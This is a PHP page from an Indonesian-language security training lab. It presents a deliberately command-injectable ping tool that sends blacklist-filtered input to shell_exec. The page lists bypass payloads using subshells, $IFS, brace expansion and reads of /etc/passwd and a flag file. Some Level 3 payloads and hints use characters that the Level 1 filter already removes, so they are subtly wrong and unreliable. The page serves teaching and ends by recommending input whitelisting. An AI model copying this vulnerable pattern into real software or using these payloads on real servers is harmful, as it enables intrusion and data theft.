<?php
$active   = 'advanced-1';
$host     = $_POST['host'] ?? '';
$level    = max(1, min(3, (int)($_POST['level'] ?? 1)));
$output   = '';
$error    = '';
$executed = false;
$filtered = '';

function safe($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

function applyFilter(string $input, int $level): string {
    $s = $input;
    if ($level >= 1) {
        // Level 1: hapus karakter separator umum
        $s = str_replace([';', '&&', '||', '|', '`'], '', $s);
    }
    if ($level >= 2) {
        // Level 2: + hapus spasi dan keyword command umum
        $s = str_replace([' ', 'cat', 'id', 'ls', 'whoami'], '', $s);
    }
    if ($level >= 3) {
        // Level 3: + hapus $() dan enkoding umum
        $s = preg_replace('/\$\(.*?\)/', '', $s);
        $s = str_replace(['%0a', '%0d', '\n', '\r'], '', $s);
    }
    return $s;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $host !== '') {
    $executed = true;
    $filtered = applyFilter($host, $level);

    // Command dieksekusi dengan input yang sudah di-filter (masih vulnerable jika bypass berhasil)
    $cmd    = "ping -c 2 " . $filtered . " 2>&1";
    $output = shell_exec($cmd);
    if ($output === null) $output = '';
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Advanced 1: CMDi Filter Bypass — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Advanced 1: CMDi + Filter Bypass</span></div>
    <h1>CMDi + Filter Bypass <span class="tag o">ADVANCED 1</span></h1>
    <p class="phdr-desc">Aplikasi memfilter separator dan keyword berbahaya menggunakan pendekatan blacklist. Tiga level filter dengan keketatan berbeda — pelajari teknik bypass untuk setiap levelnya.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Bypass Level 1: filter yang menghapus <code class="ic">; && || | `</code></span></li>
      <li><div class="obj-n">2</div><span>Bypass Level 2: filter yang juga menghapus spasi dan keyword <code class="ic">cat id ls whoami</code></span></li>
      <li><div class="obj-n">3</div><span>Bypass Level 3: filter yang menambahkan deteksi <code class="ic">$()</code> dan newline encoding</span></li>
      <li><div class="obj-n">4</div><span>Jalankan command untuk membaca <code class="ic">/var/private/flag.txt</code> di setiap level</span></li>
    </ul>
  </div>

  <!-- Level selector -->
  <div class="box">
    <div class="box-t">Filter Level</div>
    <form method="POST" action="/advanced-1/" id="level-form">
      <input type="hidden" name="host" value="">
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:14px">
        <?php foreach ([1=>'Level 1 — Separator filter', 2=>'Level 2 — + Space & keywords', 3=>'Level 3 — + Subshell & encoding'] as $n=>$lbl): ?>
        <button type="submit" name="level" value="<?= $n ?>"
          style="padding:8px 16px;border-radius:var(--r);font-size:.8rem;font-weight:600;border:1px solid;cursor:pointer;transition:all .15s;<?= $level==$n?'background:var(--rbg);border-color:var(--rbdr);color:var(--red)':'background:var(--el);border-color:var(--bd);color:var(--t2)' ?>">
          <?= $lbl ?>
        </button>
        <?php endforeach; ?>
      </div>
    </form>
    <div class="qbox" style="margin-bottom:0"><div class="ql">Active Filter Code — Level <?= $level ?></div><?php if($level===1): ?><span class="at">str_replace</span>([<span class="str">';'</span>, <span class="str">'&&'</span>, <span class="str">'||'</span>, <span class="str">'|'</span>, <span class="str">'`'</span>], <span class="str">''</span>, <span class="val">$input</span>);<?php elseif($level===2): ?><span class="at">str_replace</span>([<span class="str">';'</span>, <span class="str">'&&'</span>, <span class="str">'||'</span>, <span class="str">'|'</span>, <span class="str">'`'</span>,
              <span class="str">' '</span>, <span class="str">'cat'</span>, <span class="str">'id'</span>, <span class="str">'ls'</span>, <span class="str">'whoami'</span>], <span class="str">''</span>, <span class="val">$input</span>);<?php else: ?><span class="cm">// Level 2 filter + tambahan:</span>
<span class="at">preg_replace</span>(<span class="str">'/\$\(.*?\)/'</span>, <span class="str">''</span>, <span class="val">$s</span>);
<span class="at">str_replace</span>([<span class="str">'%0a'</span>, <span class="str">'%0d'</span>, <span class="str">'\n'</span>, <span class="str">'\r'</span>], <span class="str">''</span>, <span class="val">$s</span>);<?php endif; ?></div>
  </div>

  <div class="box">
    <div class="box-t">Ping Tool</div>
    <form method="POST" action="/advanced-1/">
      <input type="hidden" name="level" value="<?= $level ?>">
      <div class="fg">
        <label class="fl">Host Input</label>
        <input class="fi" type="text" name="host"
          value="<?= safe($host) ?>"
          placeholder="Masukkan payload dengan teknik bypass Level <?= $level ?>...">
      </div>
      <div style="display:flex;gap:10px">
        <button type="submit" class="btn btn-r">Execute</button>
        <?php if($executed): ?><a href="/advanced-1/?reset=1" class="btn btn-g" onclick="document.querySelector('input[name=level]')">Reset</a><?php endif; ?>
      </div>
    </form>
  </div>

  <?php if ($executed): ?>
  <div class="box">
    <div class="box-t">Filter Trace</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div>
        <div style="font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:6px">Input Asli</div>
        <div class="qbox" style="margin-bottom:0;color:var(--red)"><?= safe($host) ?></div>
      </div>
      <div>
        <div style="font-size:.62rem;font-weight:700;letter-spacing:.1em;text-transform:uppercase;color:var(--t3);font-family:var(--mono);margin-bottom:6px">Setelah Filter L<?= $level ?></div>
        <div class="qbox" style="margin-bottom:0;color:var(--green)"><?= safe($filtered) ?></div>
      </div>
    </div>
  </div>

  <?php if (trim($output) !== ''): ?>
  <div class="term-hdr">
    <span class="term-dot" style="background:#e63946"></span>
    <span class="term-dot" style="background:#f59e0b"></span>
    <span class="term-dot" style="background:#22c55e"></span>
    <span class="term-title">Terminal Output</span>
  </div>
  <div class="terminal"><?= safe($output) ?></div>
  <?php if (str_contains($output, 'FLAG{') || str_contains($output, 'uid=')): ?>
  <div class="alert a-ok"><strong>Bypass berhasil!</strong> Command dieksekusi meskipun filter aktif.</div>
  <?php endif; ?>
  <?php endif; ?>
  <?php endif; ?>

  <div class="box">
    <div class="box-t">Bypass Technique Reference</div>
    <div class="qbox"><div class="ql">Teknik bypass per level</div><span class="cm">-- Level 1: ; | && `` diblokir — gunakan $() atau newline</span>
<span class="str">8.8.8.8</span><span class="kw">$(</span>id<span class="kw">)</span>            <span class="cm">-- subshell: tidak diblokir di L1</span>
<span class="str">8.8.8.8</span>%0a<span class="str">id</span>           <span class="cm">-- URL-encoded newline sebagai separator</span>

<span class="cm">-- Level 2: spasi diblokir — gunakan $IFS atau {}</span>
<span class="str">8.8.8.8</span><span class="kw">$(</span><span class="str">cat</span><span class="kw">$IFS</span>/etc/passwd<span class="kw">)</span>    <span class="cm">-- $IFS = Internal Field Separator (spasi)</span>
<span class="str">8.8.8.8</span><span class="kw">$(</span>{ca,t}<span class="kw">$IFS</span>/var/private/flag.txt<span class="kw">)</span>  <span class="cm">-- brace expansion</span>

<span class="cm">-- Level 3: $() juga diblokir — gunakan backtick atau variable</span>
<span class="str">8.8.8.8</span><span class="kw">`{ca,t}${IFS}</span>/var/private/flag.txt<span class="kw">`</span>   <span class="cm">-- backtick + brace</span>
<span class="val">X</span>=<span class="str">ca</span>;<span class="val">Y</span>=<span class="str">t</span>;<span class="kw">${X}${Y}${IFS}</span>/var/private/flag.txt  <span class="cm">-- variable concat</span></div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Bypass Level 1: gunakan $() atau newline</summary>
      <div class="hint-body">Karena <code class="ic">;</code> dan <code class="ic">|</code> diblokir, gunakan subshell <code class="ic">$()</code> yang tidak ada di filter:<br><code class="ic">8.8.8.8$(id)</code><br>Atau gunakan URL-encoded newline <code class="ic">%0a</code> sebagai command separator alternatif.</div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Bypass Level 2: hilangkan spasi dengan $IFS</summary>
      <div class="hint-body"><code class="ic">$IFS</code> adalah variabel shell Internal Field Separator yang defaultnya adalah spasi.<br><code class="ic">8.8.8.8$(cat$IFS/etc/passwd)</code><br>Kata kunci <code class="ic">cat</code> diblokir, gunakan brace expansion: <code class="ic">{ca,t}</code> menghasilkan <code class="ic">cat</code>.</div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Bypass Level 3: variable concatenation</summary>
      <div class="hint-body">Pisahkan command menjadi variabel:<br><code class="ic">A=c;B=at;$A$B${IFS}/var/private/flag.txt</code><br>Filter tidak mengenali string ini sebagai perintah <code class="ic">cat</code>.</div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Kenapa blacklist selalu gagal</summary>
      <div class="hint-body">Shell bash memiliki puluhan cara untuk mengekspresikan hal yang sama. Whitelist input (validasi hanya menerima IP/hostname valid) atau gunakan <code class="ic">escapeshellarg()</code> jauh lebih aman daripada mencoba memblokir karakter berbahaya.</div>
    </details>
  </div>

</div>
<?php include '../includes/footer.php'; ?>
</body>
</html>
